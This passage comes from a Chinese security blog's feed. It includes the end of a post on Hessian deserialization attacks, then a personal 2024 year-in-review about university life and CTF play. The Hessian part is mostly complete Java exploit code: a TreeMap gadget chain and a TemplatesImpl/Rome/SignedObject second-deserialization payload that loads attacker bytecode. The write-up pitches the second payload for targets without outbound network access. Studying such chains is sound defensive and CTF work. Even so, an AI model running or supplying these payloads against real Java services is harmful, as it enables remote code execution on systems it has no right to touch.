</span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; e = Class.forName(<span class="string">&quot;java.util.TreeMap$Entry&quot;</span>);  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor1 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor1.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">a</span> <span class="operator">=</span> declaredConstructor1.newInstance(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>, <span class="literal">null</span>);  </span><br><span class="line">  </span><br><span class="line">    Constructor&lt;?&gt; declaredConstructor2 = e.getDeclaredConstructor(Object.class, Object.class, e);  </span><br><span class="line">    declaredConstructor2.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    <span class="type">Object</span> <span class="variable">o1</span> <span class="operator">=</span> declaredConstructor2.newInstance(o, <span class="number">2</span>, a);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; t = Class.forName(<span class="string">&quot;java.util.TreeMap&quot;</span>);  </span><br><span class="line">    <span class="type">TreeMap</span> <span class="variable">treeMap</span> <span class="operator">=</span> (TreeMap) t.newInstance();  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;size&quot;</span>);  </span><br><span class="line">    size.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    size.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">modCount</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;modCount&quot;</span>);  </span><br><span class="line">    modCount.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    modCount.set(treeMap,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">root</span> <span class="operator">=</span> t.getDeclaredField(<span class="string">&quot;root&quot;</span>);  </span><br><span class="line">    root.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    root.set(treeMap,a);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">Field</span> <span class="variable">right</span> <span class="operator">=</span> e.getDeclaredField(<span class="string">&quot;right&quot;</span>);  </span><br><span class="line">    right.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">    right.set(a,o1);  </span><br><span class="line">  </span><br><span class="line">    <span class="type">byte</span>[] serialize = serialize(treeMap);  </span><br><span class="line">    unSerialize(serialize);  </span><br><span class="line">  </span><br><span class="line">   &#125;  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">    <span class="type">Hessian2Output</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">    output.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);  </span><br><span class="line">    output.writeObject(obj);  </span><br><span class="line">    output.flush();  </span><br><span class="line">    <span class="type">byte</span>[] bytes = baos.toByteArray();  </span><br><span class="line">    <span class="keyword">return</span> bytes;  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unSerialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">    <span class="type">Hessian2Input</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">    input.readObject();  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/post/257d1196/IMAGE20250104195944414.png" class=""><p>成功弹出</p><h2 id="TemplatesImpl-SignedObject二次反序列化">TemplatesImpl+SignedObject二次反序列化</h2><p>使用于在不出网的场景下使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常我们使用Rome结合TemplatesImpl进行利用会发现利用不成功这是为什么呢？</p><p>这里其实是由于TemplatesImpl类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致TemplatesImpl类无法初始化</p><p>那么为什么我们之前使用Java原生的反序列化时不会报错呢？</p><p>这是因为如果在反序列化时重写readObject的类会自动调用重写的readObject方法，看一下TemplatesImpl的readObject方法</p><img src="/post/257d1196/IMAGE20250104204344810.png" class=""><p>可以看到它手动new 了一个TransformerFactoryImpl对象给_tfactory。如何绕过呢，就是结合SignedObject进行二次反序列化即可绕过因为SignedObject中的readObject是java原生的，具体原理参考<a href="https://oceanzbz.github.io/2024/12/30/Java%E5%AE%89%E5%85%A8/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">二次反序列化</a>直接给出Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;  </span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;  </span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.security.*;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_TemplatesImpl_SignedObject</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Hessian_stu/src/main/java/Exp.class&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);  </span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);  </span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);  </span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);  </span><br><span class="line">  </span><br><span class="line">        KeyPairGenerator keyPairGenerator;  </span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);  </span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();  </span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();  </span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);  </span><br><span class="line">        Hessian2_Deserial(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);  </span><br><span class="line">        hessian2Output.writeObject(o);  </span><br><span class="line">        hessian2Output.flushBuffer();  </span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class&lt;?&gt; nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;简介&lt;/h2&gt;
&lt;p&gt;Hessian 是 &lt;a href=&quot;https://caucho.com/&quot;&gt;caucho&lt;/a&gt; 公司的工程项目，为了达到或超过 ORMI/Java JNI 等其他跨语言/平台调用的能力设计而出，在 2004 点发布 1.0 规范</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Hessian" scheme="https://oceanzbz.github.io/tags/Hessian/"/>
    
  </entry>
  
  <entry>
    <title>2024总结</title>
    <link href="https://oceanzbz.github.io/post/436bddde.html"/>
    <id>https://oceanzbz.github.io/post/436bddde.html</id>
    <published>2024-12-31T02:51:55.000Z</published>
    <updated>2025-03-05T07:24:36.801Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序言">序言</h2><p>为什么要写总结呢，其实我也不知道，只是看着很多师傅都写自己也有一种想表达的欲望，虽然自己很菜。但是还是想写点什么。</p><h2 id="回顾">回顾</h2><p>回想今年自己干了什么，一时间也想不起来，感觉自己什么都没学到，所以也算是过了一段潇洒的生活。因为在大四的时候拿到了保研的offer也算是对自己本科的学习画上了一个句号。<br>在回到学校之前一直在家里摆烂，曾经也想过去实习，但是由于被护网高工资屏蔽了双眼导致自己有点觉得去实习也学不到什么东西的想法，现在回头去想想发现自己这种想法有点傻，虽然说实习工资低，不说学习到技术，至少也能学到一点在职场的经验。<br>回到学校之后生活开始变得潇洒一点了，跟舍友一起耍，每天睡到12点基本睡醒就去打🎱（🐲妈、几圈、欧来来、彪你们都还得练），🎣（祥哥的最爱），够级♥️（最喜欢小智跟我打对门，喜欢🔥小豪、田书记），⚽️（感谢旭哥（海参队长）带我拿🏆）。反正是能消耗时间的事都干了，期间还跟舍友一起去烧烤，做饭，当然我只负责带一个最去就行，强烈推荐彪子，小豪的手艺不管是做菜还是烧烤都是非常的好吃，现在还非常想念这一口。什么实力不多说看图</p><img src="/post/436bddde/IMAGE20241231123800029.png" class=""><p>4月份的时候跟舍友一起去威海自驾游，这里要感谢我们热情的小智班长为我们当作导游，请我们吃了两顿大餐一个小烧烤，还有丰盛的海鲜大餐。看了威海的风景，真的不错很推荐大家去看看。附上一张落日美景</p><img src="/post/436bddde/IMAGE20241231123956649.png" class=""><p>6月份就是毕业了，大家都很不舍，但是没办法，路还是要走的，只是要记得常聚聚。与此同时呢护网也开始了今年的护网不想提了一言难尽太抽象了不好多说什么一笔带过吧，唯一值得一提的就是去参加了互联网安全大会，听了一些讲座并且薅到了一些周边。</p><img src="/post/436bddde/IMAGE20241231124800538.png" class=""><p>8月份到了开学的日子，因为本人学校开学算是中国开学最早放假最晚的学校了☹️，但是因为有护网合同在身就跟导师申请了下晚了两个星期回到的学校。回到学校后，因为分到的宿舍其中两位都是本科实验室的同学，再加上一个也是保研来的Pwn👴浩哥，而且都是打CTF的（本人很菜），我们四个就开始一起找比赛打比赛当然也没有什么成绩，但是也拿到了一些奖，还有一些纪念品。</p><img src="/post/436bddde/IMAGE20241231124605322.png" class=""><p>在没上研究生之前我幻想的研究生生活是丰富多彩的，来之后才发现理想很丰满，现实很骨感。之前会有过读博的想法，不过现在看来感觉自己想法还是有点年轻了，论文简直是折磨死我了，虽然也没读过几篇，就这么先走一步看一步吧本身也没有什么规划。写到这有点不知道写什么了。就写彪子吧在冬至那天晚上 20:00给我打来了视频电话，开口就是熟悉的声音问我在哪呢，我就知道他来青岛了，不过也确实给我了一个惊喜，跟他喝酒叙旧第二天陪他在青岛逛了逛晚上就送他去了高铁站，只能感慨时光匆匆呐。也想念其他舍友来找我喝酒叙旧。还要写一个宫👴这个真是我的好师哥，应该说既是师哥也是好兄弟，宫哥在我困难的时候屡次帮助我，真的很感激他，虽说宫哥很抽象但是我也爱陪他玩点抽象，等时间空下来要去找一趟宫哥，线下玩点抽象哈哈哈！！！<br>邻近元旦的几天才想起把博客搭好，当然这其中也是废了好大劲才搭建成功后续写一下自己搭建的主题过程，自己的这个主题是当时看的P牛的主题觉得非常简洁大方很喜欢所以就去找了下拿过来用了。其实很早之前自己就搭建过Blog只不过当时太菜也加上服务器过期了就不了了之了。现在搭建起来一方面是为了方便记录自己的学习笔记，另一方面也想记录下自己的生活若干年后还能看看或许有不一样的感觉。今年的总结就到此为止吧希望新的一年会越来越好同时也祝愿身边所有人和师傅们越来越好！！！</p><h2 id="规划">规划</h2><p>对明年的规划也不是太清晰简单写写明年要做的事。继续学习Java漏洞，希望能在CTF比赛取得更好的成绩，在回顾回顾攻防渗透的知识，在科研方面希望能做出一点东西，该减减肥了确实有点肥了，多写写博客分享自己生活，找个大厂去搬🧱感受一下学习学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;序言&quot;&gt;序言&lt;/h2&gt;
&lt;p&gt;为什么要写总结呢，其实我也不知道，只是看着很多师傅都写自己也有一种想表达的欲望，虽然自己很菜。但是还是想写点什么。&lt;/p&gt;
&lt;h2 id=&quot;回顾&quot;&gt;回顾&lt;/h2&gt;
&lt;p&gt;回想今年自己干了什么，一时间也想不起来，感觉自己什么都没学到，所</summary>
      
    
    
    
    <category term="闲谈" scheme="https://oceanzbz.github.io/categories/%E9%97%B2%E8%B0%88/"/>
    
    
    <category term="总结" scheme="https://oceanzbz.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="闲聊" scheme="https://oceanzbz.github.io/tags/%E9%97%B2%E8%81%8A/"/>
    
  </entry>
  
  <entry>
    <title>吾杯</title>
    <link href="https://oceanzbz.github.io/post/f409d317.html"/>
    <id>https://oceanzbz.github.io/post/f409d317.html</id>
    <published>2024-12-30T15:57:49.000Z</published>
    <updated>2025-03-05T07:24:36.805Z</updated>
    
